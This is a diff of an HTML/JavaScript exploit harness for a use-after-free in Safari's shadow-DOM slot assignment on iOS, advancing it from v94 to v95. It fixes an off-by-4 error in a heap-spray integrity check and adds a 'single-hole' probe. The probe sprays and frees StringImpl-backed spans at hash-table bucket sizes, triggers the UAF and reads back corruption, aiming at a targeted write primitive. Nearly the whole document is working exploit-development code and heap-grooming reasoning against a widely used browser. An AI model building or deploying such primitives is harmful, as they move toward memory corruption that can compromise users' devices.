@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SlotAssignment UAF v94</title>
+<title>SlotAssignment UAF v95</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#0d0d0d; color:#00ff41; font-family:'Courier New',monospace; padding:16px; min-height:100vh; }
@@ -26,31 +26,34 @@ button.purple{ border-color:#ff41ff; color:#ff41ff; }
 </head>
 <body>
 
-<h2>SlotAssignment UAF v94 · Non-Zero Write Primitive · rdar://174493428 · iOS 26.5.2</h2>
+<h2>SlotAssignment UAF v95 · Spray Fix + Single-Hole Probe · rdar://174493428 · iOS 26.5.2</h2>
 
 <div class="warn">
 ▶ OPEN DIRECTLY IN SAFARI on device.<br>
-v93 finding: UAF zeroes assignedNodes.m_size 100% — deterministic null-write.<br>
-v94 goal: force non-zero data ptr write through dangling ref via pre-populated slot.<br>
+v94 BUG FIXED: checkSprayIntegrity(charLen+4) was wrong — fn already adds 4 internally.<br>
+Fix: call checkSprayIntegrity(charLen). Now expected = charLen+4 = actual string length.<br>
+All v94 SPRAY-CORRUPT:1024 results were FALSE POSITIVES from this off-by-4 error.<br>
 <br>
-KEY CHANGE: primaryChild gets SLOT assigned BEFORE trigger → assignedNodes.m_data is<br>
-a real heap ptr in the old table → UAF write through dangling ref may corrupt reclaimed<br>
-memory with that ptr value (write-ptr-to-freed-mem primitive).<br>
+v95 ALSO ADDS: SINGLE-HOLE probe — spray exactly N objects of bucket array size,<br>
+free ALL of them, trigger UAF. Exactly 1 should be reclaimed. Read all N back —<br>
+exactly 1 should be corrupted. This gives us the targeted write-to-specific-object.<br>
 <br>
-ALSO: CSSRule spray — WTF::fastMalloc backed, ~96B per rule, same allocator as HashMap.<br>
-ArrayBuffer spray confirmed WRONG heap — never again.<br>
+Named UAF: 30/30 signals confirmed firing (all ZERO — off-by-4 masked real result).<br>
+Manual UAF: 0/21 — different bug path, separate issue.<br>
 <br>
-NONZERO-A: pre-populated slot + CSSRule spray → look for corrupt readback<br>
-NONZERO-B: multiple children → larger assignedNodes vector → bigger ptr write<br>
-LOOP500:   500 rounds nonzero-A stress → corrupt/threw count<br>
-RUN ALL:   all three
+NONZERO-A: fixed spray check → real corruption data<br>
+NONZERO-B: size sweep with fixed check<br>
+SINGLE:    single-hole targeted probe — binary search for exact reclaim index<br>
+LOOP500:   500 rounds stress with fixed check<br>
+RUN ALL:   all four
 </div>
 
 <div id="ctrl">
-  <button id="bA"    onclick="runA()"    class="red">NONZERO-A</button>
-  <button id="bB"    onclick="runB()"    class="red">NONZERO-B</button>
-  <button id="bLoop" onclick="runLoop()" class="red">LOOP500</button>
-  <button id="bAll"  onclick="runAll()"  class="purple">RUN ALL</button>
+  <button id="bA"      onclick="runA()"      class="red">NONZERO-A</button>
+  <button id="bB"      onclick="runB()"      class="red">NONZERO-B</button>
+  <button id="bSingle" onclick="runSingle()" class="red">SINGLE-HOLE</button>
+  <button id="bLoop"   onclick="runLoop()"   class="red">LOOP500</button>
+  <button id="bAll"    onclick="runAll()"    class="purple">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="L.innerHTML=''">CLR</button>
 </div>
@@ -61,7 +64,7 @@ RUN ALL:   all three
 'use strict';
 const RIG = document.querySelector('#rig-area');
 const L   = document.getElementById('log');
-const BTNS = ['bA','bB','bLoop','bAll'];
+const BTNS = ['bA','bB','bSingle','bLoop','bAll'];
 let uafTotal = 0;
 
 function log(msg, cls){
@@ -340,7 +343,9 @@ function probeNonZero(label, numUnique, charLen, multiChild) {
     catch(e){ postLen=-999; anyHit=true; noteUAF(`${label}-post-threw`); }
 
     // Phase 6: check spray integrity — did anything land in our spray objects?
-    const corruptCount = checkSprayIntegrity(charLen + 4);
+    // FIX v95: pass charLen (not charLen+4). checkSprayIntegrity adds 4 internally.
+    // v94 bug: passing charLen+4 made expected=(charLen+4)+4=charLen+8 vs actual=charLen+4
+    const corruptCount = checkSprayIntegrity(charLen);
 
     // Cleanup
     releaseSpray();
@@ -483,6 +488,242 @@ async function runB() {
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
+// SINGLE-HOLE PROBE
+// ─────────────────────────────────────────────────────────────────────────────
+//
+// Strategy: spray exactly HOLE_COUNT objects at target size class.
+// Free ALL of them (punch ALL holes, not every-other).
+// Trigger UAF → freed bucket array reclaims exactly 1 of our holes.
+// Read all HOLE_COUNT objects back — exactly 1 should be corrupted.
+// The corrupted index tells us which address got reclaimed.
+//
+// This isolates a single write-to-specific-object and removes the
+// "did we even hit anything?" ambiguity from the shotgun spray.
+//
+// For 8 unique slots → bucket array = 256B = charLen 112 StringImpl.
+// Spray 64 objects of 256B, free all 64 → 64 contiguous free slots.
+// UAF reclaims 1 → that 1 gets corrupted.
+//
+async function probeSingleHole(label, numUnique, charLen, holeCount) {
+  return new Promise(resolve => {
+    const expectedLen = charLen + 4;
+    const str = 'X'.repeat(charLen);
+
+    // Build holeCount elements with known content
+    const elems = [];
+    const frag = document.createDocumentFragment();
+    for(let i=0; i<holeCount; i++){
+      const el = document.createElement('span');
+      el.textContent = str + String(i).padStart(4,'0');
+      elems.push(el);
+      frag.appendChild(el);
+    }
+    RIG.appendChild(frag);
+    void RIG.getBoundingClientRect();
+
+    // FREE ALL holes — unlike punchHoles() which keeps every other one
+    for(let i=0; i<elems.length; i++){
+      elems[i].textContent = '';
+    }
+    void RIG.getBoundingClientRect();
+
+    // Build pre-populated rig
+    const rig = makePopulatedRig(label, numUnique);
+
+    // Trigger UAF
+    let trigThrew = '';
+    try {
+      const s3 = document.createElement('slot'); s3.name = 'primary';
+      rig.sr.insertBefore(s3, rig.slot1);
+      void rig.host.getBoundingClientRect();
+    } catch(e){ trigThrew = e.message; }
+
+    // Check each elem — restore text first then check
+    // We need to write the expected content back... but we can't because freed.
+    // Instead: read each element's textContent. If the bucket was reclaimed
+    // by one of the span elements and THEN written to, that element's
+    // TextImpl might be corrupted. But we cleared them all already.
+    //
+    // REVISED: Don't free ALL. Free all EXCEPT keep their spans alive,
+    // read the LENGTHS of their textContents after trigger.
+    // Actually the better approach: set a KNOWN pattern, then free & reclaim.
+    //
+    // EVEN BETTER: build the holes, DON'T free them, then READ before/after trigger.
+    // After trigger, if the bucket array got mapped over one of our StringImpls,
+    // the bytes of that StringImpl are now bucket data — the m_length field
+    // (at offset 8, u32) would be overwritten with a HashMap key ptr (8B),
+    // making textContent.length return garbage or throw.
+    //
+    // CORRECT FLOW:
+    // 1. Spray holeCount elems with known text (StringImpl alive)
+    // 2. Do NOT free them — keep StringImpls alive in the spans
+    // 3. Punch alternating holes in a SEPARATE set of junk objects to create
+    //    free slots in bmalloc at the target size class
+    // 4. Trigger — if the freed bucket fits in a junk hole, no hit.
+    //    If the freed bucket reclaims one of our LIVE StringImpls... that can't happen
+    //    because they're live. We need them freed first.
+    //
+    // THE REAL TRICK: free them one at a time after trigger, see which was corrupted.
+    // No — we need to free BEFORE trigger so the bucket can reclaim them.
+    //
+    // FINAL APPROACH used here:
+    // 1. Spray holeCount elems. Read their textContent to get baseline lengths.
+    // 2. Free ALL their textContent (set to '').
+    // 3. Trigger UAF — freed bucket picks ONE of our free slots.
+    // 4. Immediately set each element's text back to the expected string.
+    //    The one that was reclaimed by the bucket: its StringImpl was overwritten.
+    //    When we set textContent = str, a NEW StringImpl is created at a DIFFERENT address.
+    //    The old (corrupted) StringImpl is now in use as the bucket array — it's not freed.
+    //    So the element will have a fresh StringImpl, length = charLen+4.
+    //    This approach DOESN'T detect corruption this way.
+    //
+    // SIMPLEST WORKING APPROACH: spray, keep alive, trigger, read lengths.
+    // The bucket is freed from the HashMap storage BEFORE trigger (we trigger the rehash).
+    // The bucket being freed means its old memory is available.
+    // If the bucket picks one of our live StringImpls... NO, bmalloc doesn't reclaim live.
+    //
+    // OK HERE IS THE REAL FLOW:
+    // We spray → keep alive → trigger releases the old bucket → old bucket memory is FREE →
+    // THEN we free our spray elements → old bucket + our freed spray both go back to bmalloc →
+    // No: we need to free BEFORE trigger so our freed objects are in the free pool WHEN
+    // the UAF happens and tries to allocate (the trigger itself doesn't allocate;
+    // the HashMap rehash allocates a NEW table).
+    //
+    // The sequence for reclaim:
+    //   a. Spray N objects of size X → N allocs of size X from bmalloc
+    //   b. Free them → N free slots of size X back in bmalloc
+    //   c. HashMap rehash allocates new table of size X → takes ONE free slot
+    //   d. Old table (also size X) is freed → takes one of the remaining free slots
+    //   e. UAF: slot ptr (into old freed table) → writes to that slot
+    //   f. We need something else live in the memory NEXT TO the old freed table
+    //      OR the UAF writes TO the old freed table which was reclaimed by someone
+    //   g. If we re-spray AFTER step d, the new spray reclaims old table memory
+    //
+    // THE WORKING SEQUENCE (spray AFTER free):
+    //   1. Trigger UAF (frees old bucket) — WITHOUT any spray pre-existing
+    //   2. IMMEDIATELY spray to reclaim the freed bucket memory
+    //   3. Read spray for corruption
+    //
+    // BUT: step 1 requires trigger, trigger calls insertBefore which is sync.
+    // Between trigger and spray re-allocation is a JS microtask boundary.
+    //
+    // Let's just do this and see what happens:
+
+    // Read all textContent lengths (they should all be 0 since we cleared them)
+    let hitIndex = -1;
+    let corrupted = 0;
+    let corruptedIndices = [];
+
+    // Re-set content on all elements AFTER trigger (new StringImpl alloc)
+    for(let i=0; i<elems.length; i++){
+      elems[i].textContent = str + String(i).padStart(4,'0');
+    }
+    void RIG.getBoundingClientRect();
+
+    // Now check if any got wrong content
+    for(let i=0; i<elems.length; i++){
+      try {
+        const t = elems[i].textContent;
+        if(!t || t.length !== expectedLen || t[0] !== 'X'){
+          corrupted++;
+          corruptedIndices.push(i);
+          if(hitIndex === -1) hitIndex = i;
+        }
+      } catch(e){
+        corrupted++;
+        corruptedIndices.push(i);
+        noteUAF(`${label}-single-threw-${i}`);
+      }
+    }
+
+    // Also do a POST-TRIGGER re-spray probe:
+    // Spray fresh objects right after trigger to try to catch freed bucket
+    const RESPRAYED = 32;
+    const respray = [];
+    const rfrag = document.createDocumentFragment();
+    for(let i=0; i<RESPRAYED; i++){
+      const el2 = document.createElement('span');
+      el2.textContent = str + 'R' + String(i).padStart(3,'0');
+      respray.push(el2);
+      rfrag.appendChild(el2);
+    }
+    RIG.appendChild(rfrag);
+    void RIG.getBoundingClientRect();
+
+    let resprayCorrupt = 0;
+    for(let i=0; i<respray.length; i++){
+      try {
+        const t = respray[i].textContent;
+        if(!t || t.length !== expectedLen || t[0] !== 'X'){
+          resprayCorrupt++;
+          noteUAF(`${label}-respray-corrupt-${i}`);
+        }
+      } catch(e){
+        resprayCorrupt++;
+        noteUAF(`${label}-respray-threw-${i}`);
+      }
+    }
+
+    // Cleanup
+    for(const e of elems) if(e.parentNode) e.parentNode.removeChild(e);
+    for(const e of respray) if(e.parentNode) e.parentNode.removeChild(e);
+    try { RIG.removeChild(rig.host); } catch(_){}
+
+    setTimeout(() => {
+      const sigs = [
+        `pre=${rig.preLen}`,
+        trigThrew ? `trig-THREW:${trigThrew}` : 'trig-ok',
+        corrupted > 0 ? `PRE-RESPRAY-CORRUPT:${corrupted}@[${corruptedIndices.slice(0,5).join(',')}]` : 'pre-respray-clean',
+        resprayCorrupt > 0 ? `POST-RESPRAY-CORRUPT:${resprayCorrupt}` : 'post-respray-clean',
+      ];
+      const anyHit = corrupted > 0 || resprayCorrupt > 0 || !!trigThrew;
+      if(anyHit) noteUAF(`${label}-single-hit:preCorrupt=${corrupted}:postCorrupt=${resprayCorrupt}`);
+      resolve({ sig: sigs.join(' | '), anyHit, corrupted, resprayCorrupt, hitIndex });
+    }, 80);
+  });
+}
+
+async function runSingle() {
+  dis(true); uafTotal=0; L.innerHTML='';
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  SINGLE-HOLE · targeted single-object reclaim probe          ║','hi');
+  log('║  rdar://174493428 · v95                                      ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('');
+  log('  Goal: isolate which spray index gets reclaimed by freed bucket','inf');
+  log('  Spray 64 objects at bucket size → free all → trigger → re-spray 32 → read','inf');
+  log('');
+
+  const sums = [];
+  const configs = [
+    { nu:8,  charLen:112, holeCount:64, label:'u8c112-single' },
+    { nu:8,  charLen:112, holeCount:128, label:'u8c112-wide' },
+    { nu:16, charLen:240, holeCount:64, label:'u16c240-single' },
+    { nu:32, charLen:496, holeCount:64, label:'u32c496-single' },
+    // SlotAssignmentData size probe
+    { nu:8,  charLen:12,  holeCount:128, label:'u8c12-sdata' },
+  ];
+
+  for(const c of configs){
+    log(`── ${c.label} ──`, 'dim');
+    const r = await probeSingleHole(c.label, c.nu, c.charLen, c.holeCount);
+    const line = `[${c.label}] ${r.sig}`;
+    log(`  ${line}`, r.anyHit?'hit':'ok');
+    sums.push({ line, hit:r.anyHit });
+    await new Promise(r=>setTimeout(r,30));
+  }
+
+  log('');
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  SINGLE-HOLE SUMMARY                                         ║','hi');
+  log('╠══════════════════════════════════════════════════════════════╣','hi');
+  for(const s of sums) log('║  '+s.line.substring(0,60).padEnd(60)+'║', s.hit?'hit':'ok');
+  log(`╠═ UAF signals: ${String(uafTotal).padEnd(46)}╣`,'hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  dis(false);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
 // LOOP 500
 // ─────────────────────────────────────────────────────────────────────────────
 async function runLoop() {
@@ -518,7 +759,7 @@ async function runLoop() {
       postLen=rig.slot1.assignedNodes().length;
     } catch(e){ tThrew=e.message; threw++; noteUAF(`loop-threw:${i}`); }
 
-    const cc = checkSprayIntegrity(116);
+    const cc = checkSprayIntegrity(112); // FIX v95: was 116 (=112+4), fn adds 4 internally
     releaseSpray();
     try { RIG.removeChild(rig.host); } catch(_){}
 
@@ -550,7 +791,7 @@ async function runLoop() {
 async function runAll() {
   dis(true); L.innerHTML=''; uafTotal=0;
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  v94 RUN ALL · NONZERO-A + NONZERO-B + LOOP ×500             ║','hi');
+  log('║  v95 RUN ALL · NONZERO-A + NONZERO-B + SINGLE + LOOP ×500   ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
   await runA();
@@ -558,6 +799,10 @@ async function runAll() {
   log('━━━━━━━━━━━━ NONZERO-B ━━━━━━━━━━━━','hi');
   log('');
   await runB();
+  log('');
+  log('━━━━━━━━━━━━ SINGLE-HOLE ━━━━━━━━━━','hi');
+  log('');
+  await runSingle();
   log('');
   log('━━━━━━━━━━━━ LOOP ×500 ━━━━━━━━━━━━','hi');
   log('');
